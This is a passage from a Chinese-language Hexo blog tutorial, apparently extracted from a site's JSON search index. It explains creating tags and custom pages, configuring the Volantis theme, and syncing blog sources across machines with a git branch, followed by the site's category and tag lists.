拓展：当前的主题中没有分类页和标签页怎么办？下面是tags创建步骤：根据自己的配置创建文件夹，比如配置中（根目录/_config.yml）设置的标签根目录为tag_dir: tags，所以新建tags目录。1.创建tags文件夹，在命令行中输入：hexo new page &quot;tags&quot;。2.找到新建的文件夹\\source\\tags下的index.md文件3.修改其front-matter为如下格式： 123456---title: tagsdate: 2019-08-13 09:39:50type: tags // 帮助脚本识别这是一个用来创建tags的文档layout: tag // 我的tags模版标签叫tag你可以根据你的模版名称输入对应的名称--- 4.生成静态文件：hexo g5.通过主题设置/themes/你的主题名称/_config.yml中的配置，在页面指定一个连接指向tags文件夹，就可以在页面中看到标签页了。 123456789menu: # Project: # path: /categories/Projects # card: project-card # Stuffs: # path: /tags/Stuffs # card: article-card Home: / tags: /tags Layout使用命令 1hexo new [layout] &lt;title&gt; 它默认使用的是post这个布局，也就是在source文件夹下的_post里面。Hexo 有三种默认布局：post、page 和 draft，它们分别对应不同的路径。自定义的其他布局和 post 相同，都将储存到 source&#x2F;_posts 文件夹。 page如果想另起一页，那么可以使用 1hexo new page board draft如果想写文章，又不希望被看到，那么可以 1hexo new draft newpage 这样会在source&#x2F;_draft中新建一个newpage.md文件。如果你的草稿文件写的过程中想要预览一下，那么可以使用 1hexo server --draft 在本地端口中开启服务预览。 如果你的草稿文件写完了，想要发表到post中， 1hexo publish draft newpage 就会自动把newpage.md发送到post中。 Part3 个性化官网上的主题们我用的是Volantis。在github下载并放到theme文件夹下，然后根目录下的_config.yml中把theme换成那个主题文件夹的名字，它就会自动在theme文件夹中搜索你配置的主题。volantis官方文档-主题配置进入volantis这个文件夹，可以看到里面也有一个配置文件_config.xml，这个配置文件是修改整个主题的配置文件。主题目录下的 _config.yml 文件通常负责主题相关配置，我们强烈建议您使用代替的主题配置文件以防止自己的配置丢失。如何操作呢–参见volantis官方文档-代替主题配置文件 。（以后补： default info cdn） menu其中，“关于”是找不到网页的，因为文章中没有about这个东西。如果想要的话，可以执行命令 1hexo new page about 它就会在根目录下source文件夹中新建一个about文件夹，以及index.md，在index.md中写上你想要写的东西，就可以在网站上展示出来了。（目前我把关于页挪到了顶部菜单的社交-关于我。在根目录下的_config.volantis.yml的Navigation Bar的menu部分进行相关设置。） 如果你想要自己再自定义一个菜单栏的选项，那么就 1hexo new page yourdiy 然后在主题配置文件的menu菜单栏里按照其他菜单项的格式添加一个，注意把url改了且格式保持整齐（比如有时候直接回车会出错，要删掉多余的空间然后按空格键调整格式）。然后在languages文件夹中，找到zh-CN.yml，在index中添加yourdiy: ‘中文意思’就可以显示中文了。启用搜索功能用到的插件在主题的config.yml文件中，搜索search关键字，可以看到 12# To use hexo search, you need to install the following plugins:# npm i hexo-generator-json-content Part4 hexo附加功能评论系统在主题的config.yml文件中，搜索comment关键字，可以看到一些相关内容。 Part5 git分支进行多终端工作场景：现在在自己的笔记本上写的博客，部署在了网站上。那么在家里或者实验室的台式机，发现电脑里面没有博客的文件，或者要换电脑了，最后不知道怎么移动文件，怎么办？在这里我们就可以利用git的分支系统进行多终端工作了，这样每次打开不一样的电脑，只需要进行简单的配置和在github上把文件同步下来，就可以无缝操作了。 1 原理hexo本地文件夹中的public和.deploy.git文件夹存放的是根据.md生成的html文件，也就是博客的静态文件。对比GitHub上博客仓库的master分支也可以看到该分支的文件结构和这两个文件夹中的文件一致。也就是说，执行hexo d就是把public和.deploy.git文件夹下的文件同步到github。 我们之前在GitHub创建好的仓库默认只有master分支，这个分支存放的是静态文件。所以，可以在该仓库另外创建一个hexo分支以存放Hexo网站文件，这个分支的文件就是不同电脑需要同步的文件。 2 创建新分支在GitHub创建一个新分支hexo。该分支是由master拉取，所以其中的文件一开始和master是一样的。因为我们只需要手动管理Hexo网站文件，故可以把hexo分支设置为默认分支。这样操作后，当每次修改主题或者新增博文后，先将修改的主题文件（在themes文件夹中）或新增的博客（在source文件夹中)同步到远程仓库的hexo分支，然后再通过hexo d -g发布博文，也就是将新增的博文的静态页面同步到master分支，即可实现多台终端的同步管理。 注意！这里应进入username.github.io的settings-&gt;pages，确保是由master分支提交到了博客网站。可能会被系统变为hexo分支。 3 原主机操作：初始化分支在原主机安装了hexo的目录中，该目录包含所有博客文件，进行以下操作： git init，重新初始化仓库，对代码进行版本控制 git add - A， 添加本地所有文件到仓库 git commit -m “提交说明”，添加commit； git branch hexo，添加本地分支hexo git remote add origin &lt;server&gt;，添加远程仓库，&lt;server&gt;是在线仓库的地址 git push origin hexo，将本地仓库的源文件推送到远端hexo；此时博客的源文件就同步到github的hexo分支上了。 注意！如果当前使用的theme是使用git clone下载下来的话，由于git不能嵌套，会导致主题无法push到远程仓库，导致博客出现404页面。这种情况下，若是有自己fork的主题仓库，可以删除themes文件夹中的原主题文件夹，clone自己修改后的主题仓库地址到该文件夹。 4 新主机操作：同步分支在PC2上创建文件夹Blog，在Blog文件夹下面还行以下操作： git clone 仓库地址，把远端仓库的hexo分支clone到本地 cd yourname.github.io，切换到上一步clone的文件夹中 npm install，在clone下来的仓库文件夹中安装所需要的必要组件，不需要再init 5 发布博文后续不管是PC1还是PC2，如果修改了主题或者新增了博文，按照以下步骤即可： git pull origin hexo，先pull完成本地与远端的融合 hexo new post test.md，新建一个.md文件进行测试 git add source ，经测试只要更新source即可，因为只是修改了博客。如果修改的是主题文件，则更新theme文件夹 git commit -m “修改说明”，提交修改； git push origin hexo，更新至hexo分支； hexo d -g，将博文静态页面发布至maser分支。 参考链接原文链接：https://blog.csdn.net/sinat_37781304/article/details/82729029","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://avalooooooon.github.io/tags/hexo/"}]}],"categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Webpack","slug":"前端/Webpack","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/Webpack/"},{"name":"leetcode","slug":"leetcode","permalink":"https://avalooooooon.github.io/categories/leetcode/"},{"name":"shell","slug":"shell","permalink":"https://avalooooooon.github.io/categories/shell/"},{"name":"后端","slug":"后端","permalink":"https://avalooooooon.github.io/categories/%E5%90%8E%E7%AB%AF/"},{"name":"node.js","slug":"后端/node-js","permalink":"https://avalooooooon.github.io/categories/%E5%90%8E%E7%AB%AF/node-js/"},{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/categories/vpn/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"},{"name":"HTML/CSS","slug":"前端/HTML-CSS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/HTML-CSS/"},{"name":"Vue","slug":"前端/Vue","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/Vue/"},{"name":"C++","slug":"C","permalink":"https://avalooooooon.github.io/categories/C/"},{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/categories/git/"},{"name":"文档编写","slug":"文档编写","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/"},{"name":"编辑器","slug":"文档编写/编辑器","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/%E7%BC%96%E8%BE%91%E5%99%A8/"},{"name":".md","slug":"文档编写/md","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/md/"}],"tags":[{"name":"Webpack","slug":"Webpack","permalink":"https://avalooooooon.github.io/tags/Webpack/"},{"name":"leetcode","slug":"leetcode","permalink":"https://avalooooooon.github.io/tags/leetcode/"},{"name":"操作系统","slug":"操作系统","permalink":"https://avalooooooon.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"shell","slug":"shell","permalink":"https://avalooooooon.github.io/tags/shell/"},{"name":"node.js","slug":"node-js","permalink":"https://avalooooooon.github.io/tags/node-js/"},{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/tags/vpn/"},{"name":"JS","slug":"JS","permalink":"https://avalooooooon.github.io/tags/JS/"},{"name":"HTML","slug":"HTML","permalink":"https://avalooooooon.github.io/tags/HTML/"},{"name":"CSS","slug":"CSS","permalink":"https://avalooooooon.github.io/tags/CSS/"},{"name":"Vue","slug":"Vue","permalink":"https://avalooooooon.github.io/tags/Vue/"},{"name":"C++","slug":"C","permalink":"https://avalooooooon.github.io/tags/C/"},{"name":"node","slug":"node","permalink":"https://avalooooooon.github.io/tags/node/"},{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/tags/git/"},{"name":"markdown","slug":"markdown","permalink":"https://avalooooooon.github.io/tags/markdown/"},{"name":"hexo","slug":"hexo","permalink":"https://avalooooooon.github.io/tags/hexo/"}]}